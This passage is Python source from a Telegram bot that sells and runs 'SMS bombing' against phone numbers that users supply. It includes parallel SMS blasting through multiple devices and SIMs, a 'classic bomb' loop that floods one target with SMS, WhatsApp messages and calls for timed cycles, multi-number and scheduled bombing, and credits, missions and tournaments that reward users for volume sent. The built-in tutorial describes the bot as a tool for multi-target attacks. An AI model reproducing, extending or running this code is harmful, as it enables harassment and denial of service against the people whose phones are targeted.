                f"📅 Days left: `{v['days_left']}`\n✅ *No credits needed!*\n\n"
                f"🔁 Kitne cycles? (1 cycle = 10 min)",
                parse_mode="Markdown")
        else:
            await cq.message.answer(
                f"✅ `{phone}`\n\n💰 Admin/Owner: No credits needed\n\n"
                f"🔁 Kitne cycles? (1 cycle = 10 min)",
                parse_mode="Markdown")
    else:
        credits = get_user_credits(user_id, d)
        max_cy = credits // CREDITS_PER_CYCLE
        await cq.message.answer(
            f"✅ `{phone}`\n\n💰 Credits: `{credits}`\n📊 Max cycles: `{max_cy}`\n"
            f"({CREDITS_PER_CYCLE} credits = 1 cycle)\n\n"
            f"💡 *Validity lo → credits free!*\n\nKitne credits?",
            parse_mode="Markdown")
    await cq.answer("✅ Confirmed!")


@R.callback_query(F.data.startswith("classicnuminfo:cancel:"))
async def classicnuminfo_cancel(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    try:
        await cq.message.delete()
    except:
        pass
    await cq.message.answer(
        f"❌ <b>Cancelled!</b>\n\nNumber daal ke dobara try karo.",
        parse_mode="HTML"
    )
    await cq.answer("❌ Cancelled")


# ================= SMS BLAST WITH PROGRESS (PARALLEL) =================
async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    d_check = load()
    allowed, secs = check_rate_limit(uid, d_check)
    if not allowed:
        await msg.answer(f"⏳ <b>Rate limit!</b>\n{secs}s wait karein.", parse_mode="HTML")
        return
    USER_LAST_BLAST[uid] = time.time()

    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>Started on {mask_number(number)}!</b>")

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                await msg.answer(f"⚠️ Ek sending already chal rahi hai!", parse_mode="HTML")
                return
            del USER_SESSIONS[uid]
        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    is_regular_user = should_deduct_credits(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular_user else None
    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(), parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Progress: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS: del USER_SESSIONS[uid]
        return

    sent_ok = 0; sent_fail = 0; msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()
    total_tasks = 0

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time, total_tasks
        try:
            device_tasks = []
            remaining = count
            for device in devices:
                if remaining <= 0: break
                sims = device.get("sims", [])
                sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                for sim in sim_slots:
                    if remaining <= 0: break
                    device_tasks.append({
                        "fb_id": device["fb_id"],
                        "fb_url": device["fb_url"],
                        "dev_id": device["dev_id"],
                        "sim": sim,
                        "to": number,
                        "message": message,
                    })
                    remaining -= 1

            total_tasks = len(device_tasks)
            if not device_tasks: return

            async def fire_one(task):
                ok = await send_sms_via_device(
                    task["fb_url"], task["dev_id"], task["sim"],
                    task["to"], task["message"]
                )
                async with session.lock:
                    if session.cancelled: return
                    nonlocal sent_ok, sent_fail, last_update_time
                    if ok:
                        sent_ok += 1
                        if is_regular_user:
                            d_temp = load()
                            deduct_credits(uid, 1, d_temp)
                            d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                            k = str(uid)
                            if k in d_temp["users"]:
                                d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                            d_temp.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                "number": number, "message": message[:100],
                                "timestamp": int(time.time()), "status": "sent"
                            })
                            add_mission_progress(uid, "sms_10", 1, d_temp)
                            add_mission_progress(uid, "sms_100", 1, d_temp)
                            add_tournament_score(uid, 1, d_temp)
                            save(d_temp)
                    else:
                        sent_fail += 1
                    fb_id = task["fb_id"]
                    if fb_id not in api_usage_delta:
                        api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                    api_usage_delta[fb_id]["sent" if ok else "failed"] += 1
                    now = time.time()
                    if now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or (sent_ok + sent_fail) >= count:
                        cc_live = get_user_credits(uid, load()) if is_regular_user else None
                        try:
                            await progress_msg.edit_text(
                                progress_text(sent_ok, sent_fail, count, cc_live, speed_label_display),
                                reply_markup=stop_send_kb() if not session.cancelled else None,
                                parse_mode="HTML")
                        except TelegramBadRequest: pass
                        last_update_time = now

            await asyncio.gather(*[fire_one(t) for t in device_tasks], return_exceptions=True)

        except Exception as e:
            log.error(f"Send loop: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS: del USER_SESSIONS[uid]

    d_final = load()
    if not is_regular_user:
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        add_mission_progress(uid, "sms_10", sent_ok, d_final)
        add_mission_progress(uid, "sms_100", sent_ok, d_final)
        add_tournament_score(uid, sent_ok, d_final)
    else:
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
    save(d_final)

    d_ach = load()
    new_badges = check_and_unlock_achievements(bot, uid, d_ach)
    save(d_ach)
    if new_badges:
        for badge_key in new_badges:
            b = ACHIEVEMENTS[badge_key]
            try:
                await bot.send_message(uid,
                    f"🏅 <b>NEW ACHIEVEMENT UNLOCKED!</b>\n\n"
                    f"{b['icon']} <b>{b['name']}</b>\n📋 {b['condition']}",
                    parse_mode="HTML")
            except: pass

    duration = int(time.time() - start_time)
    d_log = load()
    log_activity(d_log, "sms_blast", uid, f"Sent: {sent_ok}, Failed: {sent_fail}")
    save(d_log)

    try:
        uci = await bot.get_chat(uid)
        u_name = uci.full_name or "Unknown"
        u_uname = f"@{uci.username}" if uci.username else "No Uname"
    except:
        u_name = d_log.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Uname"

    chan_log = (f"🚀 <b>SMS BLAST LOG</b>\n\n"
                f"👤 {u_name}\n🆔 <code>{uid}</code>\n🌐 {u_uname}\n"
                f"📞 <code>{number}</code>\n💬 <code>{message[:100]}</code>\n"
                f"✅ Sent: <b>{sent_ok}</b> | ❌ Failed: <b>{sent_fail}</b>\n"
                f"⚡ Parallel: <b>{total_tasks} devices</b>\n"
                f"⏱ <b>{fmt_duration(duration)}</b>")
    asyncio.create_task(send_channel_log(bot, chan_log))

    if sent_fail == 0 and sent_ok > 0: icon = em(EMOJI_CHECK, "✅")
    elif sent_ok > 0: icon = em(EMOJI_WARNING, "⚠️")
    else: icon = em(EMOJI_CROSS, "❌")

    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n💰 Used: <b>{sent_ok}</b> | Left: <b>{remaining}</b>"
    stopped_text = f"\n🛑 <b>User ne stop kiya!</b>" if was_cancelled else ""

    if is_owner(uid, load()):
        back_btn = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙")]
    elif is_admin(uid, load()):
        back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙")]
    else:
        back_btn = [btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤"),
                    btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠")]

    try:
        await progress_msg.edit_text(
            f"{icon} <b>Blast Result</b>{stopped_text}\n\n"
            f"📞 <code>{mask_number(number)}</code>\n"
            f"✅ Sent: <b>{sent_ok}</b> | ❌ Failed: <b>{sent_fail}</b>\n"
            f"⚡ Parallel: <b>{total_tasks} devices</b>\n"
            f"⏱ <b>{fmt_duration(duration)}</b>{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML")
    except Exception as e:
        log.error(f"Final: {e}")


# ================= CLASSIC BOMB RUNNER =================
async def run_classic_bombing(bot: Bot, chat_id: int, user_id: int, phone: str, total_cycles: int, credits_per_cycle: int = CREDITS_PER_CYCLE):
    total_sms = 0; total_wa = 0; total_calls = 0

    d_run = load()
    if not should_deduct_credits(user_id, d_run):
        credits_per_cycle = 0

    await bot.send_message(user_id,
        f"💥 *CLASSIC BOMB STARTED!*\n━━━━━━━━━━━━━━━\n"
        f"📱 `{phone}`\n🔁 `{total_cycles}` × {BOMB_DURATION_MINUTES} min\n"
        f"⏱️ `{total_cycles * BOMB_DURATION_MINUTES}` min\n💰 Credits: `{total_cycles * credits_per_cycle}`\n"
        f"🕐 IST: `{ist_time_str()}`",
        parse_mode="Markdown")

    for cycle_num in range(1, total_cycles + 1):
        if not active_classic_bombings.get(user_id, False): break
        cycle_end = time.time() + (BOMB_DURATION_MINUTES * 60)
        sms_c = wa_c = call_c = 0; api_index = 0
        last_sms = last_wa = 0; progress_msg = None; last_upd = 0
        try:
            await bot.send_message(user_id, f"🔁 *CYCLE {cycle_num}/{total_cycles} STARTED*", parse_mode="Markdown")
        except: pass
        while active_classic_bombings.get(user_id, False) and time.time() < cycle_end:
            ct = time.time()
            if ct - last_sms >= SMS_INTERVAL_SECONDS:
                try:
                    s, _ = send_sms_attack(phone)
                    if s: sms_c += 1; total_sms += 1
                    last_sms = ct
                except: pass
            if ct - last_wa >= SMS_INTERVAL_SECONDS:
                try:
                    s, _ = send_whatsapp_attack(phone)
                    if s: wa_c += 1; total_wa += 1
                    last_wa = ct
                except: pass
            try:
                s, _ = send_call_attack(phone, api_index)
                if s: call_c += 1; total_calls += 1
                api_index += 1
            except: pass
            if ct - last_upd >= 5:
                rem = int(cycle_end - ct)
                m, sec = rem // 60, rem % 60
                txt = (f"⏰ *BOMB ACTIVE*\n━━━━━━━━━━━━━━━\n"
                       f"💥 `{phone}`\n🔁 Cycle: `{cycle_num}/{total_cycles}`\n"
                       f"⏱️ Left: `{m:02d}:{sec:02d}`\n"
                       f"📱 SMS: {total_sms} | 💚 WA: {total_wa} | 📞 Calls: {total_calls}\n"
                       f"🛑 /stop to cancel")
                try:
                    if progress_msg:
                        await bot.edit_message_text(txt, chat_id, progress_msg.message_id, parse_mode="Markdown")
                    else:
                        progress_msg = await bot.send_message(chat_id, txt, parse_mode="Markdown")
                except: pass
                last_upd = ct
            await asyncio.sleep(CALL_INTERVAL_SECONDS)
        if not active_classic_bombings.get(user_id, False): break
        if cycle_num < total_cycles:
            try:
                await bot.send_message(user_id, f"✅ Cycle {cycle_num}/{total_cycles} done\n🚀 Next in 3s...", parse_mode="Markdown")
                await asyncio.sleep(3)
            except: pass

    was_stopped = user_id in active_classic_bombings
    d = load()
    k = str(user_id)
    if k in d.get("users", {}):
        d["users"][k]["uses"] = d["users"][k].get("uses", 0) + 1
    d.setdefault("sms_history", {}).setdefault(str(user_id), []).append({
        "number": phone, "message": f"Classic ({total_cycles} cycles)",
        "timestamp": int(time.time()),
        "status": "stopped" if was_stopped else "completed",
        "sms_count": total_sms, "wa_count": total_wa, "call_count": total_calls,
    })
    d.setdefault("user_stats", {}).setdefault(str(user_id), {})
    d["user_stats"][str(user_id)]["bomb_count"] = d["user_stats"][str(user_id)].get("bomb_count", 0) + 1
    add_mission_progress(user_id, "bomb_3", 1, d)
    add_mission_progress(user_id, "bomb_10", 1, d)
    save(d)

    d_ach = load()
    new_badges = check_and_unlock_achievements(bot, user_id, d_ach)
    save(d_ach)
    if new_badges:
        for badge_key in new_badges:
            b = ACHIEVEMENTS[badge_key]
            try:
                await bot.send_message(user_id,
                    f"🏅 <b>NEW ACHIEVEMENT UNLOCKED!</b>\n\n"
                    f"{b['icon']} <b>{b['name']}</b>\n📋 {b['condition']}",
                    parse_mode="HTML")
            except: pass

    if user_id in active_classic_bombings: del active_classic_bombings[user_id]
    if user_id in classic_bombing_stats: del classic_bombing_stats[user_id]
    try:
        await bot.send_message(user_id,
            f"{'🛑' if was_stopped else '🏁'} *Finished*\n📱 `{phone}`\n"
            f"📱 SMS: `{total_sms}` | 💚 WA: `{total_wa}` | 📞 Calls: `{total_calls}`\n"
            f"💣 Total: `{total_sms + total_wa + total_calls}`\n"
            f"🕐 IST: `{ist_time_str()}`",
            parse_mode="Markdown")
    except: pass

    if user_id in BOMB_QUEUE and BOMB_QUEUE[user_id]:
        next_item = BOMB_QUEUE[user_id].pop(0)
        try:
            await bot.send_message(user_id,
                f"⏳ *QUEUE: Starting next bomb!*\n📱 `{next_item['phone']}`\n🔁 `{next_item['cycles']}` cycles",
                parse_mode="Markdown")
        except: pass
        active_classic_bombings[user_id] = True
        classic_bombing_stats[user_id] = {'sms': 0, 'wa': 0, 'calls': 0}
        asyncio.create_task(run_classic_bombing(bot, chat_id, user_id, next_item["phone"],
                                                next_item["cycles"], next_item["credits_per_cycle"]))


# ================= MULTI-NUMBER BOMB =================
async def multi_number_bombing(bot: Bot, chat_id: int, user_id: int, numbers: list, cycles: int, credits_per_cycle: int):
    total = len(numbers)
    await bot.send_message(user_id,
        f"🎯 *MULTI-NUMBER BOMB STARTED!*\n📊 Total: `{total}` numbers\n"
        f"🔁 Each: `{cycles}` cycles\n🕐 IST: `{ist_time_str()}`",
        parse_mode="Markdown")
    for idx, num in enumerate(numbers, 1):
        try:
            await bot.send_message(user_id, f"🚀 *[{idx}/{total}]* Starting on `{num}`", parse_mode="Markdown")
        except: pass
        active_classic_bombings[user_id] = True
        classic_bombing_stats[user_id] = {'sms': 0, 'wa': 0, 'calls': 0}
        d_now = load()
        pass_credits = credits_per_cycle if should_deduct_credits(user_id, d_now) else 0
        await run_classic_bombing(bot, chat_id, user_id, num, cycles, pass_credits)
    try:
        await bot.send_message(user_id, f"✅ *Multi-bomb complete!*\n📊 Total: `{total}`", parse_mode="Markdown")
    except: pass


# ================= MULTI-NUMBER CUSTOM SMS =================
async def multi_number_custom_sms(bot: Bot, chat_id: int, user_id: int, numbers: list, message: str, count: int, speed: float = SPEED_DEFAULT):
    total = len(numbers)
    await bot.send_message(user_id,
        f"🎯 *MULTI-NUMBER CUSTOM SMS!*\n📊 Total: `{total}` numbers\n"
        f"💬 `{message[:50]}`\n🔢 `{count}` SMS each\n🕐 IST: `{ist_time_str()}`",
        parse_mode="Markdown")
    for idx, num in enumerate(numbers, 1):
        try:
            await bot.send_message(user_id, f"🚀 *[{idx}/{total}]* Starting on `{num}`", parse_mode="Markdown")
        except: pass
        devices = get_cached_devices() or await get_all_online_devices(load())
        if devices:
            await run_scheduled_custom_sms(bot, user_id, num, message, count, devices, speed)
    try:
        await bot.send_message(user_id, f"✅ *Multi-number SMS complete!*\n📊 Total: `{total}`", parse_mode="Markdown")
    except: pass


# ================= SCHEDULED CUSTOM SMS RUNNER (PARALLEL) =================
async def run_scheduled_custom_sms(bot: Bot, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    """
    PARALLEL SMS FIRING — Saare devices ek saath trigger.
    """
    is_regular_user = should_deduct_credits(uid, load())
    if not devices or count <= 0:
        return

    results = {"sent": 0, "failed": 0}
    lock = asyncio.Lock()

    async def fire_device(task):
        ok = await send_sms_via_device(
            task["fb_url"], task["dev_id"], task["sim"],
            task["to"], task["message"]
        )
        async with lock:
            if ok:
                results["sent"] += 1
                if is_regular_user:
                    d_temp = load()
                    deduct_credits(uid, 1, d_temp)
                    d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                    k = str(uid)
                    if k in d_temp["users"]:
                        d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                    add_mission_progress(uid, "sms_10", 1, d_temp)
                    add_mission_progress(uid, "sms_100", 1, d_temp)
                    add_tournament_score(uid, 1, d_temp)
                    save(d_temp)
            else:
                results["failed"] += 1

    device_tasks = []
    remaining = count
    for device in devices:
        if remaining <= 0: break
        sims = device.get("sims", [])
        sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
        for sim_slot in sim_slots:
            if remaining <= 0: break
            device_tasks.append({
                "fb_id": device["fb_id"],
                "fb_url": device["fb_url"],
                "dev_id": device["dev_id"],
                "sim": sim_slot,
                "to": number,
                "message": message,
            })
            remaining -= 1

    if not device_tasks:
        return

    log.info(f"[PARALLEL] Firing {len(device_tasks)} SMS requests simultaneously")
    start_time = time.time()

    await asyncio.gather(*[fire_device(t) for t in device_tasks], return_exceptions=True)

    duration = int(time.time() - start_time)

    try:
        await bot.send_message(uid,
            f"✅ <b>Scheduled SMS Complete!</b>\n\n"
            f"📱 <code>{mask_number(number)}</code>\n"
            f"✅ Sent: <b>{results['sent']}</b>\n"
            f"❌ Failed: <b>{results['failed']}</b>\n"
            f"⚡ Parallel Devices: <b>{len(device_tasks)}</b>\n"
            f"⏱ Time: <b>{duration}s</b>",
            parse_mode="HTML")
    except: pass

    log.info(f"[PARALLEL] Done in {duration}s | Sent: {results['sent']} | Failed: {results['failed']}")
# =====================================================================
# PART 4 — Start Commands, Tutorial, Profile, Lists, Queue, Templates,
#          Achievements UI, Missions UI, Tournament UI, Spin, Language
# =====================================================================
# ⚠️ Isko PART 3 ke turant baad paste karo
# =====================================================================


# ================= START COMMANDS =================
@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    if is_new:
        log_text = (f"🆕 <b>NEW USER</b>\n👤 {name}\n🆔 <code>{uid}</code>\n🌐 {username}\n"
                    f"📅 <code>{ist_str('%d/%m/%Y %H:%M')}</code>")
        asyncio.create_task(send_channel_log(msg.bot, log_text))
    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""
    if code.startswith("REF"):
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, msg_text, referrer = process_referral(uid, code, d)
            if success and referrer:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    await msg.bot.send_message(referrer,
                        f"🎉 <b>{ref_name}</b> ne aapka referral code use kiya!\n💰 +{d['settings']['ref_credits']} credits",
                        parse_mode="HTML")
                except: pass
        save(d)
    if is_maintenance(d) and not is_admin(uid, d):
        await msg.answer(maintenance_text(d), parse_mode="HTML")
        return
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    await send_random_video(msg.bot, msg.chat.id, caption=f"🚀 Welcome!\nOwner: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"🚫 <b>Banned</b>", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"⛔ <b>No access</b>", parse_mode="HTML")
        return
    await msg.answer(user_home_text(uid, d, 1), reply_markup=user_kb_page1(), parse_mode="HTML")
    if is_new and not d["users"][str(uid)].get("tutorial_done"):
        asyncio.create_task(show_tutorial_prompt(msg.bot, msg.chat.id, uid))


@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    save(d)
    if is_new:
        log_text = (f"🆕 <b>NEW USER</b>\n👤 {name}\n🆔 <code>{uid}</code>\n🌐 {username}\n"
                    f"📅 <code>{ist_str('%d/%m/%Y %H:%M')}</code>")
        asyncio.create_task(send_channel_log(msg.bot, log_text))
    if is_maintenance(d) and not is_admin(uid, d):
        await msg.answer(maintenance_text(d), parse_mode="HTML")
        return
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    await send_random_video(msg.bot, msg.chat.id, caption=f"🚀 Welcome!\nOwner: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"🚫 <b>Banned</b>", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"⛔ <b>No access</b>", parse_mode="HTML")
        return
    await msg.answer(user_home_text(uid, d, 1), reply_markup=user_kb_page1(), parse_mode="HTML")


async def show_tutorial_prompt(bot: Bot, chat_id: int, uid: int):
    try:
        await asyncio.sleep(2)
        await bot.send_message(chat_id,
            f"👋 <b>Welcome {sc('new user')}!</b>\n\n"
            f"📚 Tutorial dekhna chahenge?\n<i>Sirf 1 minute lagega!</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [btn("📚 sᴛᴀʀᴛ ᴛᴜᴛᴏʀɪᴀʟ", "user:tutorial:start", EMOJI_CHECK, "✅")],
                [btn("⏭ sᴋɪᴘ", "user:tutorial:skip", EMOJI_CROSS, "⏭")]]),
            parse_mode="HTML")
    except: pass


# ================= FORCE JOIN CHECK =================
@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    if is_maintenance(d) and not is_admin(uid, d):
        await cq.answer("🛠 Maintenance!", show_alert=True)
        try:
            await cq.message.edit_text(maintenance_text(d), parse_mode="HTML")
        except: pass
        return
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return
    await cq.answer("✅ Verified!", show_alert=True)
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"🚀 Verified!\nOwner: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d, 1), reply_markup=user_kb_page1(), parse_mode="HTML")


# ================= TUTORIAL =================
TUTORIAL_STEPS = [
    {"title": "1️⃣ WELCOME", "text": ("📚 <b>Step 1/6 — Welcome!</b>\n\n"
        "Ye bot SMS bombing, classic bomb, aur multi-target attacks ke liye hai.\n\n"
        "💡 <i>Tip: Bottom ke buttons se navigation easy ho jata hai.</i>")},
    {"title": "2️⃣ SEND SMS", "text": ("📤 <b>Step 2/6 — Send SMS</b>\n\n"
        "1. <b>SEND SMS</b> button click\n2. Target number daalo\n3. Number info check hogi\n"
        "4. <b>Agree & Continue</b> dabao\n5. Message likho\n6. Speed select\n7. Count daalo\n\n"
        "💰 1 SMS = 1 credit\n🎫 Validity active → No credits needed!")},
    {"title": "3️⃣ CLASSIC BOMB", "text": ("💥 <b>Step 3/6 — Classic Bomb</b>\n\n"
        "SMS + WhatsApp + Calls teeno ek saath!\n\n"
        "💰 5 credits = 1 cycle = 10 minutes\n"
        "🎫 Validity active → No credits!\n\n"
        "🛑 /stop se cancel")},
    {"title": "4️⃣ SCHEDULE BOMB", "text": ("⏰ <b>Step 4/6 — Schedule Bomb</b>\n\n"
        "1. Type choose karo (Custom SMS / Classic Bomb)\n"
        "2. Number daalo\n3. Time HH:MM IST\n"
        "4. Cycles (Classic) ya Message+Speed+Count (Custom)\n\n"
        "🕐 Sab times <b>Indian Standard Time</b>")},
    {"title": "5️⃣ LISTS + TEMPLATES", "text": ("📋 <b>Step 5/6 — Lists & Templates</b>\n\n"
        "📋 Saved Lists: Common targets save karo\n"
        "📝 Templates: Frequently used messages save karo\n"
        "⏳ Queue: Multiple bombs line me lagao\n"
        "🏅 Achievements: Badges unlock karo\n"
        "🎯 Missions: Daily missions complete karo")},
    {"title": "6️⃣ BONUS FEATURES", "text": ("🎁 <b>Step 6/6 — Bonus!</b>\n\n"
        "🎡 Spin Wheel: Roz spin karke credits jeeto\n"
        "🎯 Milestones: Referrals pe bonus credits\n"
        "🎲 Lucky Draw: Weekly winner bano\n"
        "🏆 Tournament: Har hafte SMS competition\n\n"
        "🎫 Validity active → All features free!")},
]


@R.callback_query(F.data == "user:tutorial")
async def user_tutorial_start(cq: CallbackQuery, state: FSMContext):
    await state.update_data(tut_step=0)
    await show_tutorial_step(cq, 0)


@R.callback_query(F.data == "user:tutorial:start")
async def user_tutorial_start_btn(cq: CallbackQuery, state: FSMContext):
    await cq.answer("📚 Starting...")
    await state.update_data(tut_step=0)
    await show_tutorial_step(cq, 0)


@R.callback_query(F.data == "user:tutorial:skip")
async def user_tutorial_skip(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if str(uid) in d.get("users", {}):
        d["users"][str(uid)]["tutorial_done"] = True
        save(d)
    await cq.answer("✅ Skipped!", show_alert=True)
    try:
        await cq.message.edit_reply_markup(reply_markup=None)
    except: pass


async def show_tutorial_step(cq: CallbackQuery, step: int):
    if step < 0: step = 0
    if step >= len(TUTORIAL_STEPS):
        d = load()
        uid = cq.from_user.id
        if str(uid) in d.get("users", {}):
            d["users"][str(uid)]["tutorial_done"] = True
            save(d)
        await cq.message.edit_text(
            f"✅ <b>Tutorial Complete!</b>\n\nAb aap ready ho!\n\n"
            f"💡 Kabhi bhi <b>📚 ᴛᴜᴛᴏʀɪᴀʟ</b> se dobara dekh sakte ho.",
            reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    step_data = TUTORIAL_STEPS[step]
    total = len(TUTORIAL_STEPS)
    nav_row = []
    if step > 0:
        nav_row.append(btn("◀️ ᴘʀᴇᴠ", f"user:tutorial:step:{step-1}", EMOJI_GEAR, "◀️"))
    if step < total - 1:
        nav_row.append(btn("ɴᴇxᴛ ▶️", f"user:tutorial:step:{step+1}", EMOJI_GEAR, "▶️"))
    else:
        nav_row.append(btn("✅ ғɪɴɪsʜ", f"user:tutorial:step:{step+1}", EMOJI_CHECK, "✅"))
    rows = []
    if nav_row: rows.append(nav_row)
    rows.append([btn("⏭ sᴋɪᴘ", "user:tutorial:skip", EMOJI_CROSS, "⏭")])
    rows.append([btn("🏠 ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠")])
    try:
        await cq.message.edit_text(f"{step_data['text']}\n\n<i>Page {step+1}/{total}</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data.startswith("user:tutorial:step:"))
async def user_tutorial_nav(cq: CallbackQuery, state: FSMContext):
    step = int(cq.data.split(":")[-1])
    await show_tutorial_step(cq, step)
    await cq.answer()


# ================= HOME HANDLERS =================
@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if is_maintenance(d) and not is_admin(uid, d):
        try:
            await cq.message.edit_text(maintenance_text(d), parse_mode="HTML")
        except: pass
        return
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return
    if is_owner(uid, d):
        try:
            await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        except: pass
        return
    if is_admin(uid, d):
        try:
            await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        except: pass
        return
    if not can_use(uid, d):
        try:
            await cq.message.edit_text(f"⛔ Access nahi!", parse_mode="HTML")
        except: pass
        return
    try:
        await cq.message.edit_text(user_home_text(uid, d, 1), reply_markup=user_kb_page1(), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "user:page:1")
async def user_page_1(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not can_use(uid, d):
        await cq.answer("⛔ Access denied!", show_alert=True)
        return
    try:
        await cq.message.edit_text(user_home_text(uid, d, 1), reply_markup=user_kb_page1(), parse_mode="HTML")
    except: pass
    await cq.answer()


@R.callback_query(F.data == "user:page:2")
async def user_page_2(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not can_use(uid, d):
        await cq.answer("⛔ Access denied!", show_alert=True)
        return
    try:
